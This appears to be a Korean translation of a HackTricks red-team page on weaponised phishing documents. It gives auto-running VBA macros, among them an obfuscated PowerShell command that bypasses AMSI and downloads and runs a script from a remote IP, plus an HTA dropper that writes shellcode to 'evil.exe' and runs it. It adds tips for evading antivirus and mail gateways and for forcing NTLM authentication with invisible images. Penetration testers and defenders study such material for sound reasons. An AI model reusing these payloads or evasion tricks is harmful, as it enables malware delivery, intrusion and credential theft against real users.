# 피싱 파일 및 문서

<details>

<summary><strong>제로부터 영웅이 될 때까지 AWS 해킹을 배우세요</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사가 HackTricks에 광고되길 원하시나요**? 혹은 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요, 저희의 독점 [**NFT 컬렉션**](https://opensea.io/collection/the-peass-family)
* [**공식 PEASS & HackTricks 스왹**](https://peass.creator-spring.com)을 받아보세요
* **[💬](https://emojipedia.org/speech-balloon/) Discord 그룹**에 **가입**하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하시거나 **트위터**에서 **팔로우**해보세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **해킹 트릭을 공유하고 싶으시다면** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **로 PR을 제출해보세요**.

</details>

## 오피스 문서

Microsoft Word는 파일을 열기 전에 파일 데이터 유효성을 수행합니다. 데이터 유효성은 OfficeOpenXML 표준에 대한 데이터 구조 식별을 통해 수행됩니다. 데이터 구조 식별 중에 오류가 발생하면 분석 중인 파일이 열리지 않습니다.

일반적으로 매크로를 포함하는 Word 파일은 `.docm` 확장자를 사용합니다. 그러나 파일 확장자를 변경하여 파일 이름을 변경하고도 여전히 매크로 실행 기능을 유지할 수 있습니다.\
예를 들어 RTF 파일은 설계상 매크로를 지원하지 않지만, RTF로 이름이 바뀐 DOCM 파일은 Microsoft Word에서 처리되어 매크로 실행이 가능합니다.\
동일한 내부 및 메커니즘은 Microsoft Office Suite의 모든 소프트웨어(Excel, PowerPoint 등)에 적용됩니다.

일부 Office 프로그램에서 실행될 확장자를 확인하려면 다음 명령을 사용할 수 있습니다:
```bash
assoc | findstr /i "word excel powerp"
```
### 외부 이미지 로드

이동: _삽입 --> 빠른 부분 --> 필드_\
_**카테고리**: 링크 및 참조, **필드 이름**: includePicture, 그리고 **파일 이름 또는 URL**:_ http://\<ip>/whatever

![](<../../.gitbook/assets/image (155).png>)

### 매크로 백도어

문서에서 매크로를 사용하여 임의의 코드를 실행하는 것이 가능합니다.

#### 자동로드 함수

더 일반적인 함수일수록 AV가 감지할 가능성이 높습니다.

* AutoOpen()
* Document\_Open()

#### 매크로 코드 예제
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### 메타데이터 수동 제거

**파일 > 정보 > 문서 검사 > 문서 검사**로 이동하여 문서 검사 도구를 열 수 있습니다. **검사**를 클릭한 다음 **문서 속성 및 개인 정보** 옆의 **모두 제거**를 클릭합니다.

#### 문서 확장자

작업을 마치면 **다른 이름으로 저장** 드롭다운을 선택하여 형식을 **`.docx`**에서 **Word 97-2003 `.doc`**로 변경합니다.\
이렇게 하는 이유는 **매크로를 `.docx` 내부에 저장할 수 없기 때문**이며, 매크로가 포함된 **`.docm`** 확장자에는 **낙인**이 있어서 (예: 썸네일 아이콘에 큰 `!`가 표시되어 있음) 웹/이메일 게이트웨이에서 완전히 차단할 수 있습니다. 따라서 이 **기존 `.doc` 확장자가 최상의 타협안**입니다.

#### 악성 매크로 생성기

* MacOS
* [**macphish**](https://github.com/cldrn/macphish)
* [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA 파일

HTA는 **HTML 및 VBScript 및 JScript와 같은 스크립팅 언어를 결합한 Windows 프로그램**입니다. 이는 사용자 인터페이스를 생성하고 브라우저의 보안 모델 제약 없이 "완전히 신뢰할 수 있는" 응용 프로그램으로 실행됩니다.

HTA는 **`mshta.exe`**를 사용하여 실행되며, 일반적으로 **인터넷 익스플로러와 함께 설치**되어 **`mshta`가 IE에 의존**합니다. 따라서 IE가 제거되었을 경우 HTA는 실행할 수 없습니다.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM 인증 강제

**원격으로 NTLM 인증을 "강제"하는 여러 가지 방법**이 있습니다. 예를 들어 이메일이나 HTML에 **보이지 않는 이미지**를 추가하거나 사용자가 액세스할 것으로 예상되는 파일의 주소를 피해자에게 보내면 (심지어 HTTP MitM?) **폴더를 열기만으로도 인증을 유도**할 수 있습니다.

**다음 페이지에서 이러한 아이디어와 더 많은 내용을 확인하세요:**

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md" %}
[places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
{% endcontent-ref %}

### NTLM 릴레이

해시나 인증 정보를 훔치는 것뿐만 아니라 **NTLM 릴레이 공격**도 수행할 수 있다는 것을 잊지 마세요:

* [**NTLM 릴레이 공격**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
* [**AD CS ESC8 (인증서로 NTLM 릴레이)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

<details>

<summary><strong>제로부터 영웅이 될 때까지 AWS 해킹 배우기</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* **사이버 보안 회사에서 일하시나요**? **HackTricks에 귀사를 광고하고 싶으신가요**? 아니면 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 저희의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 얻으세요
* **💬** [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **해킹 요령을 공유하려면** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **에 PR을 제출**하세요.

</details>
